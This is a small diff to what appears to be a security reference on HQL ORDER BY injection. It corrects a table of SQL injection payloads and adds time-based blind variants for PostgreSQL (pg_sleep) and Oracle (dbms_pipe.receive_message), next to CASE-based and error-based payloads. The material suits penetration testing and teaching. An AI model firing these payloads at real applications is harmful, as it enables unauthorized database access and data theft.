@@ -546,7 +546,8 @@ ORDER BY injection in HQL is particularly challenging because of parser restrict
 | Technique | DBMS | Payload |
 |---|---|---|
 | **CASE-based blind** | All | `(CASE WHEN (subquery) THEN fieldA ELSE fieldB END)` |
-| **Function-based** | PostgreSQL | `dbms_pipe_receive_message()` equivalent via XML functions |
+| **Function-based (time)** | PostgreSQL | `pg_sleep(5)` via `(CASE WHEN (subquery) THEN pg_sleep(5) ELSE pg_sleep(0) END)` |
+| **Function-based (time)** | Oracle | `dbms_pipe.receive_message('x',5)` — note: this is an **Oracle** function (`DBMS_PIPE` package), not PostgreSQL |
 | **Error-based** | Oracle | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('SQL')), col)` |
 
 ---
